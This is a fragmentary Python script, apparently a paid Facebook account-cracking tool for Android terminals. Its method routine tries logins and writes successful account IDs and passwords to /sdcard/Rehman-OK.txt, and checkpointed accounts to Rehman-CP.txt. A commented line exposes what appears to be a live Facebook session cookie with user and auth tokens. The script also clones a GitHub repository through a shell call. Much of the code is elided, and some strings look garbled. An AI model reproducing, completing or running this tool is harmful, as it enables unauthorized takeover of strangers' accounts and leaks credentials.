...
"""{ 
    ...
    # 'cookie': 'dpr=2.75; datr=qJfgY143PMEYa7fhTl-cCdyY; sb=q5fgY0X75I8gG8Jlmzd4Qas0; locale=en_US; c_user=100089486097441; xs=23%3ApDJx17CjTrCAgw%3A2%3A1676003911%3A-1%3A-1; fr=0qmCl1tN39L19Tcz7.AWW5htkSYkuarmKLG-ZcEkHB8RY.Bj5L4z.kk.AAA.0.0.Bj5cpG.AWVRw0uj_9E; m_page_voice=100089486097441; m_pixel_ratio=2.75; wd=393x733',
...
\033[1;97m║\033[1;93mCREATOR║ \033[1;97m♤͜͡♤\033[1;96m ABDULREHMAN \033[1;97m♤͜͡♤ \033[1;96mREHMAN AR
\033[1;97m║\033[1;93mSUPPORT║ \033[1;97m♤͜͡♤ \033[1;92m 0.1
\033[1;97m║\033[1;93mSTATUS ║ \033[1;97m♤͜͡♤\033[1;92m Paid
\033[1;97m╚═════\033[1;97m⸎══════════════\033[1;97m⸎══════════\033[1;97m⸎════════╝'''
...
def AR_Main():
    ...
    if inpp == "2":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Rehman-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=Rehman-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=Rehman-2233]'))
...
def method():
    ...
    print(f"{oo('•')}/sdcard/Rehman-OK.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                ...
                open('/sdcard/Rehman-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                cpacc.append(acc)
                open('/sdcard/Rehman-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
